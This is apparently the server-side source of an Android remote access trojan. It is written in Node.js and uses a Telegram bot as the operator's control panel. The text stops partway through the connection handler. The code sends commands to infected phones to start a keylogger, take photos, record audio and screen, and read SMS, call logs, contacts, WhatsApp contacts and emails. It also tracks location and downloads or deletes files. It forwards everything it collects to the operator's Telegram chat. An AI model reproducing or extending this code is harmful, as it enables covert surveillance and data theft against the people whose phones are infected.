const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// ========== CONFIGURATION ==========
const BOT_TOKEN = process.env.BOT_TOKEN;
const BOT_CHAT_ID = process.env.BOT_CHAT_ID;
const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || crypto.randomBytes(16).toString('hex');
const MAX_COMMAND_AGE = 10 * 60 * 1000; // 10 minutes
const HEARTBEAT_TIMEOUT = 2 * 60 * 1000; // 2 minutes

if (!BOT_TOKEN || !BOT_CHAT_ID) {
    console.error('❌ ERROR: BOT_TOKEN and BOT_CHAT_ID environment variables are required!');
    process.exit(1);
}

// ========== INITIALIZE ==========
const app = express();
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 60000,
    pingInterval: 25000
});

// ========== MULTER SETUP ==========
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });

const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadDir),
    filename: (req, file, cb) => {
        const unique = crypto.randomBytes(8).toString('hex');
        cb(null, `${Date.now()}_${unique}_${file.originalname}`);
    }
});
const upload = multer({ storage, limits: { fileSize: 100 * 1024 * 1024 } }); // 100MB

// ========== TELEGRAM BOT ==========
const bot = new TelegramBot(BOT_TOKEN, { 
    polling: { 
        autoStart: true,
        params: { timeout: 10 }
    } 
});

// Graceful stop on exit
process.on('SIGINT', () => bot.stopPolling());
process.on('SIGTERM', () => bot.stopPolling());

console.log('🤖 Bot is running...');

// ========== STORAGE ==========
const connectedDevices = new Map(); // socketId -> deviceId
const socketMap = new Map(); // deviceId -> socketId
const appData = new Map(); // deviceId -> info
const commandQueue = new Map(); // requestId -> commandInfo
const commandHistory = []; // Array of past commands
const activeSessions = new Map(); // chatId -> {state, data, timeout}
const deviceGroups = new Map(); // groupName -> [deviceIds]

// ========== HELPER FUNCTIONS ==========
function safeSendMessage(chatId, text, options = {}) {
    const MAX_LENGTH = 4096;
    if (text.length > MAX_LENGTH) {
        const chunks = text.match(new RegExp(`.{1,${MAX_LENGTH}}`, 'gs')) || [text];
        chunks.forEach((chunk, i) => {
            setTimeout(() => {
                bot.sendMessage(chatId, chunk, options).catch(err => 
                    console.error('Send message error:', err.message)
                );
            }, i * 100);
        });
        return;
    }
    return bot.sendMessage(chatId, text, options).catch(err => 
        console.error('Send message error:', err.message)
    );
}

function broadcastToAll(event, data) {
    io.emit(event, data);
}

function broadcastToDevice(deviceId, event, data) {
    const socketId = socketMap.get(deviceId);
    if (!socketId) return false;
    const socket = io.sockets.sockets.get(socketId);
    if (!socket || !socket.connected) {
        socketMap.delete(deviceId);
        return false;
    }
    socket.emit(event, data);
    return true;
}

function sendCommandToDevice(chatId, command, extras = {}, target = 'all') {
    const requestId = `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
    const payload = {
        request: command,
        extras: extras,
        requestId: requestId,
        from: 'telegram',
        timestamp: Date.now()
    };

    commandQueue.set(requestId, { 
        chatId, 
        command, 
        timestamp: Date.now(),
        target,
        status: 'pending'
    });

    // Keep history
    commandHistory.unshift({
        requestId,
        command,
        target,
        chatId,
        timestamp: new Date().toISOString(),
        status: 'pending'
    });
    if (commandHistory.length > 1000) commandHistory.pop();

    let sent = false;
    if (target !== 'all') {
        sent = broadcastToDevice(target, 'message', payload);
    } else {
        broadcastToAll('message', payload);
        sent = connectedDevices.size > 0;
    }

    if (sent) {
        safeSendMessage(chatId, 
            `📤 Command *${command}* sent to ${target === 'all' ? 'ALL devices' : `\`${target}\``}`,
            { parse_mode: 'Markdown', ...getMainKeyboard() }
        );
    } else {
        safeSendMessage(chatId, 
            `❌ No device found: \`${target}\`\n📱 Connected: ${connectedDevices.size}`,
            { parse_mode: 'Markdown', ...getMainKeyboard() }
        );
        commandQueue.delete(requestId);
    }
}

function formatSize(bytes) {
    if (!bytes || bytes === 0) return '0 B';
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return (bytes / Math.pow(1024, i)).toFixed(1) + ' ' + sizes[i];
}

function formatDuration(ms) {
    const sec = Math.floor(ms / 1000);
    if (sec < 60) return `${sec}s`;
    const min = Math.floor(sec / 60);
    if (min < 60) return `${min}m ${sec % 60}s`;
    return `${Math.floor(min / 60)}h ${min % 60}m`;
}

function cleanupOldCommands() {
    const now = Date.now();
    for (const [id, cmd] of commandQueue) {
        if (now - cmd.timestamp > MAX_COMMAND_AGE) {
            commandQueue.delete(id);
            const hist = commandHistory.find(h => h.requestId === id);
            if (hist) hist.status = 'expired';
        }
    }
}

function setSession(chatId, state, data = {}, timeoutMs = 300000) {
    // Clear existing
    const existing = activeSessions.get(chatId);
    if (existing?.timeout) clearTimeout(existing.timeout);
    
    const timeout = setTimeout(() => activeSessions.delete(chatId), timeoutMs);
    activeSessions.set(chatId, { state, data, timeout, createdAt: Date.now() });
}

function clearSession(chatId) {
    const existing = activeSessions.get(chatId);
    if (existing?.timeout) clearTimeout(existing.timeout);
    activeSessions.delete(chatId);
}

function getSession(chatId) {
    return activeSessions.get(chatId);
}

// ========== KEYBOARDS ==========
function getMainKeyboard() {
    return {
        reply_markup: {
            keyboard: [
                ['📱 Devices', '📊 Status'],
                ['📷 Camera', '🎥 Video', '📸 Screenshot'],
                ['🎬 Screen Record', '🎤 Mic', '🔊 Volume'],
                ['📁 File Manager', '📍 Location', '👥 Contacts'],
                ['📨 SMS', '📞 Call', '📋 Clipboard'],
                ['🔦 Flashlight', '📶 WiFi', '📡 Bluetooth'],
                ['✈️ System', '🔐 Keylogger', '⚙️ Settings'],
                ['🔄 Reboot', '💀 Kill App', '📱 Remote Control']
            ],
            resize_keyboard: true
        }
    };
}

function getDeviceKeyboard() {
    const devices = [];
    for (const [socketId, deviceId] of connectedDevices) {
        const info = appData.get(deviceId) || {};
        const status = info.lastHeartbeat && (Date.now() - new Date(info.lastHeartbeat).getTime() < HEARTBEAT_TIMEOUT) ? '🟢' : '🟡';
        devices.push([`${status} ${deviceId}`]);
    }
    if (devices.length === 0) devices.push(['❌ No Devices']);
    devices.push(['🔙 Back to Main']);
    return {
        reply_markup: {
            keyboard: devices,
            resize_keyboard: true
        }
    };
}

function getVolumeKeyboard() {
    return {
        reply_markup: {
            keyboard: [
                ['🔊 Volume Up', '🔉 Volume Down'],
                ['🔇 Mute', '🔊 Unmute'],
                ['🔙 Back to Main']
            ],
            resize_keyboard: true
        }
    };
}

function getFlashlightKeyboard() {
    return {
        reply_markup: {
            keyboard: [
                ['🔦 Turn On', '🔦 Turn Off'],
                ['🔙 Back to Main']
            ],
            resize_keyboard: true
        }
    };
}

function getWiFiKeyboard() {
    return {
        reply_markup: {
            keyboard: [
                ['📶 WiFi On', '📶 WiFi Off'],
                ['📶 WiFi Networks', '📶 WiFi Info'],
                ['🔙 Back to Main']
            ],
            resize_keyboard: true
        }
    };
}

function getBluetoothKeyboard() {
    return {
        reply_markup: {
            keyboard: [
                ['📡 BT On', '📡 BT Off'],
                ['📡 BT Devices', '📡 BT Info'],
                ['🔙 Back to Main']
            ],
            resize_keyboard: true
        }
    };
}

function getSystemKeyboard() {
    return {
        reply_markup: {
            keyboard: [
                ['✈️ Airplane Mode', '🌙 DND', '📳 Vibrate'],
                ['🔄 Reboot', '🔒 Lock Screen', '🧹 Clear Cache'],
                ['⚙️ System Info', '📱 Running Apps', '💾 Storage'],
                ['🔋 Battery', '📶 Network', '📱 SIM Info'],
                ['🔙 Back to Main']
            ],
            resize_keyboard: true
        }
    };
}

function getKeyloggerKeyboard() {
    return {
        reply_markup: {
            keyboard: [
                ['▶️ Start Keylogger', '⏹️ Stop Keylogger'],
                ['📊 Get Keylogs', '🗑️ Clear Keylogs'],
                ['🔙 Back to Main']
            ],
            resize_keyboard: true
        }
    };
}

function getFileManagerKeyboard() {
    return {
        reply_markup: {
            keyboard: [
                ['📂 List Files', '📄 File Info'],
                ['⬇️ Download File', '🗑️ Delete File'],
                ['📤 Upload File', '📁 Create Folder'],
                ['🔙 Back to Main']
            ],
            resize_keyboard: true
        }
    };
}

function getSettingsKeyboard() {
    return {
        reply_markup: {
            keyboard: [
                ['📨 SMS Forward On', '📨 SMS Forward Off'],
                ['🎯 Select Target Device', '📢 Broadcast Mode'],
                ['🗑️ Clear History', '📊 Command Stats'],
                ['🔙 Back to Main']
            ],
            resize_keyboard: true
        }
    };
}

function getCameraKeyboard() {
    return {
        reply_markup: {
            keyboard: [
                ['📷 Front Camera', '📷 Back Camera'],
                ['🔙 Back to Main']
            ],
            resize_keyboard: true
        }
    };
}

function getMicKeyboard() {
    return {
        reply_markup: {
            keyboard: [
                ['🎤 5 sec', '🎤 15 sec', '🎤 30 sec'],
                ['🎤 1 min', '🎤 5 min', '🎤 Custom'],
                ['🔙 Back to Main']
            ],
            resize_keyboard: true
        }
    };
}

function getScreenRecordKeyboard() {
    return {
        reply_markup: {
            keyboard: [
                ['🎬 15 sec', '🎬 30 sec', '🎬 1 min'],
                ['🎬 2 min', '🎬 5 min', '🎬 Custom'],
                ['🔙 Back to Main']
            ],
            resize_keyboard: true
        }
    };
}

function getClipboardKeyboard() {
    return {
        reply_markup: {
            keyboard: [
                ['📋 Get Clipboard', '📋 Set Clipboard'],
                ['🔙 Back to Main']
            ],
            resize_keyboard: true
        }
    };
}

function getBackButton() {
    return {
        reply_markup: {
            keyboard: [['🔙 Back to Main']],
            resize_keyboard: true
        }
    };
}

// ========== BUTTON TO COMMAND MAPPING ==========
const buttonToCommand = {
    // Main
    '📱 Devices': 'showDevices',
    '📊 Status': 'getDeviceInfo',
    
    // Camera
    '📷 Camera': 'showCameraMenu',
    '📷 Front Camera': 'takePhoto',
    '📷 Back Camera': 'takePhotoBack',
    
    // Video/Screen
    '🎥 Video': 'takeVideo',
    '📸 Screenshot': 'takeScreenshot',
    '🎬 Screen Record': 'showScreenRecordMenu',
    '🎬 15 sec': 'screenRecord15',
    '🎬 30 sec': 'screenRecord30',
    '🎬 1 min': 'screenRecord60',
    '🎬 2 min': 'screenRecord120',
    '🎬 5 min': 'screenRecord300',
    '🎬 Custom': 'screenRecordCustom',
    
    // Mic
    '🎤 Mic': 'showMicMenu',
    '🎤 5 sec': 'recordAudio5',
    '🎤 15 sec': 'recordAudio15',
    '🎤 30 sec': 'recordAudio30',
    '🎤 1 min': 'recordAudio60',
    '🎤 5 min': 'recordAudio300',
    '🎤 Custom': 'recordAudioCustom',
    
    // Volume
    '🔊 Volume': 'showVolumeMenu',
    '🔊 Volume Up': 'volumeUp',
    '🔉 Volume Down': 'volumeDown',
    '🔇 Mute': 'mute',
    '🔊 Unmute': 'unmute',
    
    // File Manager
    '📁 File Manager': 'showFileManager',
    '📂 List Files': 'listFiles',
    '📄 File Info': 'getFileInfoPrompt',
    '⬇️ Download File': 'downloadFilePrompt',
    '🗑️ Delete File': 'deleteFilePrompt',
    '📤 Upload File': 'uploadFilePrompt',
    '📁 Create Folder': 'createFolderPrompt',
    
    // Location & Contacts
    '📍 Location': 'getLocation',
    '👥 Contacts': 'getContacts',
    
    // Clipboard
    '📋 Clipboard': 'showClipboardMenu',
    '📋 Get Clipboard': 'getClipboard',
    '📋 Set Clipboard': 'setClipboardPrompt',
    
    // Flashlight
    '🔦 Flashlight': 'showFlashlightMenu',
    '🔦 Turn On': 'flashlightOn',
    '🔦 Turn Off': 'flashlightOff',
    
    // WiFi
    '📶 WiFi': 'showWiFiMenu',
    '📶 WiFi On': 'wifiOn',
    '📶 WiFi Off': 'wifiOff',
    '📶 WiFi Networks': 'getWifiNetworks',
    '📶 WiFi Info': 'getNetworkInfo',
    
    // Bluetooth
    '📡 Bluetooth': 'showBluetoothMenu',
    '📡 BT On': 'bluetoothOn',
    '📡 BT Off': 'bluetoothOff',
    '📡 BT Devices': 'getBluetoothDevices',
    '📡 BT Info': 'getBluetoothInfo',
    
    // System
    '✈️ System': 'showSystemMenu',
    '✈️ Airplane Mode': 'airplaneMode',
    '🌙 DND': 'doNotDisturb',
    '📳 Vibrate': 'vibrate',
    '🔄 Reboot': 'reboot',
    '💀 Kill App': 'killAppPrompt',
    '🔒 Lock Screen': 'lockScreen',
    '🧹 Clear Cache': 'clearCache',
    '⚙️ System Info': 'getSystemInfo',
    '📱 Running Apps': 'listRunningApps',
    '💾 Storage': 'getStorageStats',
    '🔋 Battery': 'getBatteryInfo',
    '📶 Network': 'getNetworkInfo',
    '📱 SIM Info': 'getSimInfo',
    
    // SMS Forward
    '📨 SMS Forward On': 'enableSMSForward',
    '📨 SMS Forward Off': 'disableSMSForward',
    
    // Keylogger
    '🔐 Keylogger': 'showKeyloggerMenu',
    '▶️ Start Keylogger': 'startKeylogger',
    '⏹️ Stop Keylogger': 'stopKeylogger',
    '📊 Get Keylogs': 'getKeylogs',
    '🗑️ Clear Keylogs': 'clearKeylogs',
    
    // Remote Control
    '📱 Remote Control': 'getFullDeviceInfo',
    
    // SMS/Call
    '📨 SMS': 'sendSmsPrompt',
    '📞 Call': 'makeCallPrompt',
    
    // Settings
    '⚙️ Settings': 'showSettingsMenu',
    '🎯 Select Target Device': 'selectTargetDevice',
    '📢 Broadcast Mode': 'setBroadcastMode',
    '🗑️ Clear History': 'clearHistory',
    '📊 Command Stats': 'commandStats'
};

// ========== SOCKET.IO ==========
io.on('connection', (socket) => {
    console.log(`🔌 Client connected: ${socket.id}`);
    const deviceId = socket.handshake.query.deviceId || `device_${socket.id.substring(0, 8)}`;
    const platform = socket.handshake.query.platform || 'unknown';

    // Disconnect existing socket for same device
    const existingSocketId = socketMap.get(deviceId);
    if (existingSocketId && existingSocketId !== socket.id) {
        const oldSocket = io.sockets.sockets.get(existingSocketId);
        if (oldSocket) {
            oldSocket.disconnect(true);
            connectedDevices.delete(existingSocketId);
        }
    }

    connectedDevices.set(socket.id, deviceId);
    socketMap.set(deviceId, socket.id);
    
    if (!appData.has(deviceId)) {
        appData.set(deviceId, {
            id: deviceId,
            platform: platform,
            connectedAt: new Date().toISOString(),
            lastHeartbeat: new Date().toISOString(),
            smsForwarding: false,
            target: false
        });
    } else {
        const current = appData.get(deviceId);
        appData.set(deviceId, { ...current, platform, lastHeartbeat: new Date().toISOString() });
    }

    console.log(`📱 Device connected: ${deviceId} (${platform})`);

    safeSendMessage(BOT_CHAT_ID, 
        `📱 *New Device Connected*\n🆔: \`${deviceId}\`\n📱 Platform: ${platform}\n🔌 Socket: \`${socket.id}\``,
        { parse_mode: 'Markdown', ...getMainKeyboard() }
    );

    // ========== DEVICE INFO ==========
    socket.on('deviceInfo', (data) => {
        try {
            const info = typeof data === 'string' ? JSON.parse(data) : data;
            const current = appData.get(deviceId) || {};
            appData.set(deviceId, { ...current, ...info, lastUpdate: new Date().toISOString() });
            
            let message = `📊 *Device Info Update*\n🆔: ${deviceId}\n`;
            if (info.model) message += `📱 Model: ${info.model}\n`;
            if (info.androidVersion) message += `🤖 Android: ${info.androidVersion}\n`;
            if (info.battery !== undefined) message += `🔋 Battery: ${info.battery}%\n`;
            if (info.storage) message += `💾 Storage: ${info.storage}\n`;
            if (info.network) message += `📶 Network: ${info.network}\n`;
            if (info.ip) message += `🌐 IP: \`${info.ip}\`\n`;
            
            safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
        } catch (e) {
            console.error('Device info error:', e.message);
        }
    });

    // ========== RESPONSES ==========
    socket.on('response', (data) => {
        console.log(`📩 Response from ${deviceId}:`, data);
        
        const requestId = data.requestId;
        const queueItem = commandQueue.get(requestId);
        
        let message = `📨 *Command Response*\n📱 From: \`${deviceId}\`\n`;
        
        if (queueItem) {
            queueItem.status = data.status || 'completed';
            queueItem.responseTime = Date.now() - queueItem.timestamp;
            message += `📌 Command: ${queueItem.command}\n`;
            message += `⏱️ Response Time: ${formatDuration(queueItem.responseTime)}\n`;
            
            if (data.response && data.response.status) {
                message += `📦 Status: *${data.response.status}*`;
            } else if (data.status) {
                message += `📦 Status: *${data.status}*`;
            } else {
                const respStr = JSON.stringify(data.response || data, null, 2);
                message += `📦 Data:\n\`\`\`json\n${respStr.substring(0, 3000)}\n\`\`\``;
            }
            commandQueue.delete(requestId);
        } else {
            const respStr = JSON.stringify(data, null, 2);
            message += `📦 Data:\n\`\`\`json\n${respStr.substring(0, 3000)}\n\`\`\``;
        }
        
        safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== FILE UPLOAD ==========
    socket.on('fileUpload', (data) => {
        try {
            const { filename, content, mimeType } = data;
            if (!filename || !content) return;
            
            const buffer = Buffer.from(content, 'base64');
            const filePath = path.join(uploadDir, `${Date.now()}_${filename}`);
            fs.writeFileSync(filePath, buffer);
            
            const size = formatSize(buffer.length);
            safeSendMessage(BOT_CHAT_ID,
                `📤 *File Uploaded*\n📱 Device: ${deviceId}\n📄 ${filename}\n📦 Size: ${size}`,
                { parse_mode: 'Markdown', ...getMainKeyboard() }
            );
            
            // Send file to Telegram
            if (buffer.length < 50 * 1024 * 1024) {
                bot.sendDocument(BOT_CHAT_ID, filePath).catch(console.error);
            }
        } catch (e) {
            console.error('File upload error:', e.message);
        }
    });

    // ========== MEDIA FILES ==========
    socket.on('mediaFile', (data) => {
        try {
            const { type, content, filename, caption } = data;
            const buffer = Buffer.from(content, 'base64');
            const opts = { caption: caption || `${type} from ${deviceId}` };
            
            if (type === 'photo') {
                bot.sendPhoto(BOT_CHAT_ID, buffer, opts).catch(console.error);
            } else if (type === 'video') {
                bot.sendVideo(BOT_CHAT_ID, buffer, opts).catch(console.error);
            } else if (type === 'audio') {
                bot.sendVoice(BOT_CHAT_ID, buffer, opts).catch(console.error);
            } else {
                bot.sendDocument(BOT_CHAT_ID, buffer, { ...opts, filename }).catch(console.error);
            }
        } catch (e) {
            console.error('Media send error:', e.message);
        }
    });

    // ========== LOCATION ==========
    socket.on('location', (data) => {
        const lat = data.latitude || data.lat;
        const lng = data.longitude || data.lng;
        
        let message = `📍 *Location from ${deviceId}*\n`;
        if (lat && lng) {
            message += `🌐 Latitude: ${lat}\n`;
            message += `🌐 Longitude: ${lng}\n`;
            if (data.accuracy) message += `🎯 Accuracy: ${data.accuracy}m\n`;
            if (data.altitude) message += `⛰️ Altitude: ${data.altitude}m\n`;
            if (data.speed) message += `🚀 Speed: ${data.speed}m/s\n`;
            message += `🗺️ [Open Map](https://www.google.com/maps?q=${lat},${lng})`;
        } else {
            message += `❌ Location unavailable`;
        }
        
        safeSendMessage(BOT_CHAT_ID, message, { 
            parse_mode: 'Markdown', 
            disable_web_page_preview: false,
            ...getMainKeyboard() 
        });
        
        if (lat && lng) {
            bot.sendLocation(BOT_CHAT_ID, parseFloat(lat), parseFloat(lng)).catch(console.error);
        }
    });

    // ========== FILE LIST ==========
    socket.on('fileList', (data) => {
        const files = Array.isArray(data) ? data : (data.files || []);
        let message = `📂 *Files from ${deviceId}*\n`;
        message += `📁 Total: ${files.length}\n\n`;
        
        if (files.length === 0) {
            message += 'No files found or directory is empty.';
        } else {
            files.slice(0, 30).forEach((file, index) => {
                const isDir = file.isDirectory ? '📁' : '📄';
                const size = file.size ? `(${formatSize(file.size)})` : '';
                message += `${index + 1}. ${isDir} \`${file.name || 'Unknown'}\` ${size}\n`;
            });
            if (files.length > 30) {
                message += `\n... and ${files.length - 30} more`;
            }
        }
        
        safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== APP LIST ==========
    socket.on('appList', (data) => {
        const apps = data.apps || data || [];
        let message = `📱 *Apps on ${deviceId}*\n`;
        message += `📊 Total: ${apps.length}\n`;
        
        const systemApps = apps.filter(a => a.isSystem).length;
        const userApps = apps.filter(a => a.isUser).length;
        message += `📱 User: ${userApps} | ⚙️ System: ${systemApps}\n\n`;
        
        apps.slice(0, 25).forEach((app, index) => {
            const type = app.isSystem ? '⚙️' : '📱';
            message += `${index + 1}. ${type} ${app.name || app.packageName}\n`;
        });
        if (apps.length > 25) {
            message += `\n... and ${apps.length - 25} more`;
        }
        
        safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== RUNNING APPS ==========
    socket.on('runningApps', (data) => {
        const apps = data.apps || data || [];
        let message = `🔄 *Running Apps on ${deviceId}*\n`;
        message += `📊 Total: ${apps.length}\n\n`;
        
        apps.slice(0, 25).forEach((app, index) => {
            message += `${index + 1}. ${app.name || app.packageName}`;
            if (app.pid) message += ` (PID: ${app.pid})`;
            if (app.importance !== undefined) message += ` [${app.importance}]`;
            message += `\n`;
        });
        if (apps.length > 25) {
            message += `\n... and ${apps.length - 25} more`;
        }
        
        safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== APP INFO ==========
    socket.on('appInfo', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `📱 *App Info*\n📱 Device: ${deviceId}\n\n`;
        message += `📱 Name: ${info.name || 'Unknown'}\n`;
        message += `📦 Package: \`${info.packageName || 'Unknown'}\`\n`;
        message += `📌 Version: ${info.versionName || 'Unknown'}\n`;
        message += `🔢 Code: ${info.versionCode || 'Unknown'}\n`;
        message += `⚙️ System: ${info.isSystem ? '✅ Yes' : '❌ No'}\n`;
        if (info.installTime) message += `📅 Installed: ${info.installTime}\n`;
        if (info.updateTime) message += `🔄 Updated: ${info.updateTime}\n`;
        if (info.permissions && info.permissions.length > 0) {
            message += `\n🔐 Permissions (${info.permissions.length}):\n`;
            info.permissions.slice(0, 15).forEach(p => message += `   • ${p}\n`);
        }
        
        safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== WHATSAPP STATUS ==========
    socket.on('whatsappStatus', (data) => {
        const installed = data.installed ? '✅ Installed' : '❌ Not Installed';
        let message = `💬 *WhatsApp Status*\n📱 Device: ${deviceId}\n📊 Status: ${installed}`;
        if (data.versionName) message += `\n📌 Version: ${data.versionName}`;
        if (data.versionCode) message += `\n🔢 Code: ${data.versionCode}`;
        
        safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== WHATSAPP CONTACTS ==========
    socket.on('whatsappContacts', (data) => {
        const contacts = Array.isArray(data) ? data : [];
        let message = `👥 *WhatsApp Contacts*\n📱 Device: ${deviceId}\n📊 Total: ${contacts.length}\n\n`;
        
        contacts.slice(0, 30).forEach((contact, index) => {
            message += `${index + 1}. ${contact.name || 'Unknown'} - \`${contact.number || 'N/A'}\`\n`;
        });
        if (contacts.length > 30) {
            message += `\n... and ${contacts.length - 30} more`;
        }
        
        safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== EMAIL LIST ==========
    socket.on('emailList', (data) => {
        const emails = Array.isArray(data) ? data : [];
        let message = `📧 *Emails on ${deviceId}*\n📊 Total: ${emails.length}\n\n`;
        
        emails.slice(0, 25).forEach((email, index) => {
            message += `${index + 1}. ${email.name || 'Unknown'} - \`${email.email}\`\n`;
        });
        if (emails.length > 25) {
            message += `\n... and ${emails.length - 25} more`;
        }
        
        safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== EMAIL CONTACTS ==========
    socket.on('emailContacts', (data) => {
        const contacts = Array.isArray(data) ? data : [];
        let message = `👤 *Email Contacts*\n📱 Device: ${deviceId}\n📊 Total: ${contacts.length}\n\n`;
        
        contacts.slice(0, 25).forEach((contact, index) => {
            message += `${index + 1}. ${contact.name || 'Unknown'} - \`${contact.email}\`\n`;
        });
        if (contacts.length > 25) {
            message += `\n... and ${contacts.length - 25} more`;
        }
        
        safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== SMS LIST ==========
    socket.on('smsList', (data) => {
        const smsList = Array.isArray(data) ? data : [];
        let message = `📨 *SMS Messages*\n📱 Device: ${deviceId}\n📊 Total: ${smsList.length}\n\n`;
        
        smsList.slice(0, 20).forEach((sms, index) => {
            message += `${index + 1}. 📱 From: \`${sms.from || 'Unknown'}\`\n`;
            message += `   📝 ${(sms.message || '').substring(0, 100)}${(sms.message || '').length > 100 ? '...' : ''}\n`;
            message += `   🕐 ${sms.time || 'N/A'}\n\n`;
        });
        if (smsList.length > 20) {
            message += `... and ${smsList.length - 20} more`;
        }
        
        safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== CALL LOGS ==========
    socket.on('callLogs', (data) => {
        const calls = Array.isArray(data) ? data : [];
        let message = `📞 *Call Logs*\n📱 Device: ${deviceId}\n📊 Total: ${calls.length}\n\n`;
        
        const emojis = { 'Incoming': '📥', 'Outgoing': '📤', 'Missed': '❌', 'Rejected': '🚫' };
        calls.slice(0, 20).forEach((call, index) => {
            const emoji = emojis[call.type] || '📞';
            message += `${index + 1}. ${emoji} ${call.name || call.number || 'Unknown'}\n`;
            message += `   📌 Type: ${call.type || 'Unknown'}\n`;
            message += `   ⏱️ Duration: ${call.duration || 'N/A'}\n`;
            message += `   🕐 ${call.time || 'N/A'}\n\n`;
        });
        if (calls.length > 20) {
            message += `... and ${calls.length - 20} more`;
        }
        
        safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== CONTACTS ==========
    socket.on('contacts', (data) => {
        const contacts = Array.isArray(data) ? data : [];
        let message = `👥 *Contacts on ${deviceId}*\n📊 Total: ${contacts.length}\n\n`;
        
        contacts.slice(0, 30).forEach((contact, index) => {
            message += `${index + 1}. ${contact.name || 'Unknown'} - \`${contact.number || 'N/A'}\`\n`;
        });
        if (contacts.length > 30) {
            message += `\n... and ${contacts.length - 30} more`;
        }
        
        safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== SYSTEM INFO ==========
    socket.on('systemInfo', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `⚙️ *System Info*\n📱 Device: ${deviceId}\n\n`;
        message += `📱 Model: ${info.model || 'Unknown'}\n`;
        message += `🤖 Android: ${info.androidVersion || 'Unknown'}\n`;
        if (info.manufacturer) message += `🏷️ Manufacturer: ${info.manufacturer}\n`;
        if (info.brand) message += `🏷️ Brand: ${info.brand}\n`;
        if (info.device) message += `📱 Device: ${info.device}\n`;
        message += `🔧 CPU: ${info.cpu || 'Unknown'}\n`;
        message += `⚡ Cores: ${info.cores || 'Unknown'}\n`;
        message += `💾 RAM Total: ${info.totalRam || 'Unknown'}\n`;
        message += `💾 RAM Available: ${info.availableRam || 'Unknown'}\n`;
        message += `💾 RAM Used: ${info.usedRam || 'Unknown'}\n`;
        if (info.uptime) message += `⏱️ Uptime: ${formatDuration(info.uptime * 1000)}\n`;
        
        safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== FULL DEVICE INFO ==========
    socket.on('fullDeviceInfo', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `📱 *Full Device Info*\n🆔: \`${deviceId}\`\n\n`;
        message += `📱 Model: ${info.model || 'Unknown'}\n`;
        message += `🏷️ Brand: ${info.brand || 'Unknown'}\n`;
        message += `🏷️ Manufacturer: ${info.manufacturer || 'Unknown'}\n`;
        message += `🤖 Android: ${info.androidVersion || 'Unknown'}\n`;
        message += `🔧 API Level: ${info.apiLevel || 'Unknown'}\n`;
        if (info.fingerprint) message += `🔑 Fingerprint: \`${info.fingerprint.substring(0, 50)}...\`\n`;
        message += `🔋 Battery: ${info.batteryLevel || 'Unknown'}%\n`;
        message += `💾 Storage Total: ${info.totalStorage || 'Unknown'}\n`;
        message += `💾 Storage Available: ${info.availableStorage || 'Unknown'}\n`;
        message += `💾 RAM Total: ${info.totalRam || 'Unknown'}\n`;
        message += `💾 RAM Available: ${info.availableRam || 'Unknown'}\n`;
        message += `📶 WiFi: ${info.wifiEnabled ? '✅ ON' : '❌ OFF'}\n`;
        message += `📡 Bluetooth: ${info.bluetoothEnabled ? '✅ ON' : '❌ OFF'}\n`;
        if (info.simState) message += `📱 SIM State: ${info.simState}\n`;
        if (info.networkOperator) message += `📶 Network: ${info.networkOperator}\n`;
        if (info.ipAddress) message += `🌐 IP: \`${info.ipAddress}\`\n`;
        
        safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== BATTERY INFO ==========
    socket.on('batteryInfo', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `🔋 *Battery Info*\n📱 Device: ${deviceId}\n\n`;
        message += `📊 Level: ${info.level || 'Unknown'}%\n`;
        message += `⚡ Status: ${info.status || 'Unknown'}\n`;
        if (info.plugged) message += `🔌 Plugged: ${info.plugged}\n`;
        if (info.health) message += `❤️ Health: ${info.health}\n`;
        if (info.temperature) message += `🌡️ Temperature: ${info.temperature}°C\n`;
        if (info.voltage) message += `⚡ Voltage: ${info.voltage}mV\n`;
        
        // Alert if low battery
        if (info.level && info.level < 15 && info.plugged === 'UNPLUGGED') {
            message += `\n⚠️ *LOW BATTERY WARNING!*`;
        }
        
        safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

